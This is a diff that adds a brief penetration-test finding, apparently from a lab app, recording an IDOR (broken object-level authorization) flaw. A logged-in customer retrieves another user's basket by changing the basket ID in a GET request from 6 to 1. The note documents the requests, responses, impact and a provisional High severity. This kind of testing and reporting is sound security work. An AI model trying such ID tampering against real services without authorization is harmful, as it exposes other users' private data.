@@ -1,0 +1,20 @@
+IDOR / Broken Object-Level Authorization - Basket
+Authenticated user:
+User ID: 25
+Role: customer
+Own basket:
+GET /rest/basket/6
+HTTP 200 OK
+UserId: 25
+Unauthorized basket:
+GET /rest/basket/1
+HTTP 200 OK
+UserId: 1
+The authenticated customer account was able to retrieve another
+user's basket by changing the basket identifier from 6 to 1.
+Impact:
+An authenticated low-privileged user can access another user's
+basket data without authorization.
+Classification:
+Confirmed IDOR / Broken Object-Level Authorization
+Severity: High (provisional)
